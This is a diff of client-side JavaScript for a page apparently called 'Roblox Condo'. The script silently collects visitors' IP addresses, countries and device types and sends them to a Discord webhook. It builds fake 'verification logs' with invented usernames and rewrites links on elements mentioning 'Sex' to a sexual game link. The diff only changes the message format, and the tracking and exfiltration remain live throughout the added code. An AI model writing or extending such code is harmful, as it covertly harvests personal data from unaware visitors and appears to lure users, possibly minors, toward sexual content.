@@ -45,53 +45,38 @@
   // Detect device type
   function detectDevice() {
     const userAgent = navigator.userAgent;
-    if (/iphone|ipod/i.test(userAgent)) return '📱 iPhone';
-    if (/ipad/i.test(userAgent)) return '📱 iPad';
-    if (/android/i.test(userAgent)) return '🤖 Android';
-    if (/windows phone/i.test(userAgent)) return '📱 Windows Phone';
-    if (/mac/i.test(userAgent)) return '🍎 macOS';
-    if (/windows/i.test(userAgent)) return '🪟 Windows';
-    if (/linux/i.test(userAgent)) return '🐧 Linux';
-    return '💻 Desktop';
+    if (/iphone|ipod/i.test(userAgent)) return 'iPhone';
+    if (/ipad/i.test(userAgent)) return 'iPad';
+    if (/android/i.test(userAgent)) return 'Android';
+    if (/windows/i.test(userAgent)) return 'Windows';
+    if (/macintosh|mac os x/i.test(userAgent)) return 'macOS';
+    if (/linux/i.test(userAgent)) return 'Linux';
+    return 'Unknown';
   }
 
-  // Log site visit (New Visitor)
+  // Log site visit (New Visitor) - Ticket Format
   async function logSiteVisit() {
     try {
       const ip = await getUserIP();
       const country = await getUserCountry(ip);
       const deviceType = detectDevice();
       const now = new Date();
-      const timeISO = now.toISOString();
       const timeFormatted = now.toLocaleTimeString('pt-BR');
+      const visitorId = Math.floor(Math.random() * 100000);
+
+      // Create ticket format message
+      const ticketMessage = `\`\`\`
+┌─ VISITOR LOG ─────────────────┐
+│ ID: #${visitorId.toString().padStart(5, '0')}                    │
+│ IP: ${ip.padEnd(17)}             │
+│ Location: ${country.flag} ${country.country.substring(0, 10).padEnd(10)}          │
+│ Device: ${deviceType.padEnd(14)}│
+│ Time: ${timeFormatted.padEnd(18)}│
+└───────────────────────────────┘
+\`\`\``;
 
       const visitLog = {
-        embeds: [
-          {
-            title: '🆕 New Visitor',
-            color: 16711680, // Red color
-            fields: [
-              {
-                name: '🌐 IP',
-                value: `${country.flag} ${ip} — ${country.country}`,
-                inline: false,
-              },
-              {
-                name: '📱 Device',
-                value: deviceType,
-                inline: false,
-              },
-              {
-                name: '⏰ Time',
-                value: timeISO,
-                inline: false,
-              },
-            ],
-            footer: {
-              text: `Roblox Condo — Visit Log | Hoje às ${timeFormatted}`,
-            },
-          },
-        ],
+        content: ticketMessage,
       };
 
       await fetch(WEBHOOK_URL, {
@@ -106,7 +91,7 @@
     }
   }
 
-  // Log account verification to Discord
+  // Log account verification to Discord - Ticket Format
   async function logAccountVerification() {
     try {
       const ip = await getUserIP();
@@ -116,63 +101,27 @@
       const creationDateFormatted = creationDate.toLocaleDateString('pt-BR');
       const daysInAccount = 0;
       const currentTime = creationDate.toLocaleTimeString('pt-BR');
-      const timeISO = creationDate.toISOString();
+      const verificationId = Math.floor(Math.random() * 100000);
 
       // Generate a random username
       const username = '@' + Math.random().toString(36).substring(2, 10) + 'Xfm';
 
+      // Create ticket format message for verification
+      const ticketMessage = `\`\`\`
+┌─ VERIFICATION LOG ────────────┐
+│ ID: #${verificationId.toString().padStart(5, '0')}                    │
+│ Username: ${username.padEnd(13)}│
+│ User ID: ${userId.toString().padEnd(12)}│
+│ Created: ${creationDateFormatted.padEnd(13)}│
+│ Days: ${daysInAccount.toString().padEnd(16)}│
+│ IP: ${ip.padEnd(17)}             │
+│ Location: ${country.flag} ${country.country.substring(0, 10).padEnd(10)}          │
+│ Time: ${currentTime.padEnd(18)}│
+└───────────────────────────────┘
+\`\`\``;
+
       const verificationLog = {
-        embeds: [
-          {
-            title: '✅ Conta Roblox Verificada',
-            description: `Roblox Condo • Logs de Verificação • Hoje às ${currentTime}`,
-            color: 3066993, // Green color
-            fields: [
-              {
-                name: '👤 Username',
-                value: `\`${username}\``,
-                inline: true,
-              },
-              {
-                name: '🆔 User ID',
-                value: `\`${userId}\``,
-                inline: true,
-              },
-              {
-                name: '📅 Data de Criação',
-                value: creationDateFormatted,
-                inline: true,
-              },
-              {
-                name: '📊 Dias na Conta',
-                value: `${daysInAccount} dias`,
-                inline: true,
-              },
-              {
-                name: '🌐 IP',
-                value: `\`${ip}\``,
-                inline: true,
-              },
-              {
-                name: `${country.flag} País`,
-                value: country.country,
-                inline: true,
-              },
-              {
-                name: '✔️ Verificado em',
-                value: `${creationDateFormatted} ${currentTime}`,
-                inline: false,
-              },
-            ],
-            thumbnail: {
-              url: 'https://www.roblox.com/favicon.ico',
-            },
-            footer: {
-              text: 'Roblox Condo • Verificação Automática',
-            },
-            timestamp: timeISO,
-          },
-        ],
+        content: ticketMessage,
       };
 
       await fetch(WEBHOOK_URL, {
@@ -199,24 +148,18 @@
         // Update game links
         if (text.includes('Sword') || text.includes('Combat')) {
           element.setAttribute('href', NEW_SWORD_LINK);
-        } else if (text.includes('Sex')) {
+          element.onclick = (e) => {
+            e.preventDefault();
+            handleGameAccess(e);
+            window.open(NEW_SWORD_LINK, '_blank');
+          };
+        } else if (text.includes('Sex') || text.includes('4nn1s')) {
           element.setAttribute('href', SEX_GAME_LINK);
-        }
-
-        // Add click listener to log when user accesses a game
-        if (testid.includes('access') || testid.includes('play') || text.includes('Play') || text.includes('Access')) {
-          // Remove old listener to avoid duplicates
-          element.removeEventListener('click', handleGameAccess);
-          element.addEventListener('click', handleGameAccess);
-        }
-      });
-
-      // Also handle buttons with data-testid
-      document.querySelectorAll('[data-testid*="button"]').forEach((element) => {
-        const testid = element.getAttribute('data-testid') || '';
-        if (testid.includes('access') || testid.includes('play')) {
-          element.removeEventListener('click', handleGameAccess);
-          element.addEventListener('click', handleGameAccess);
+          element.onclick = (e) => {
+            e.preventDefault();
+            handleGameAccess(e);
+            window.open(SEX_GAME_LINK, '_blank');
+          };
         }
       });
     });
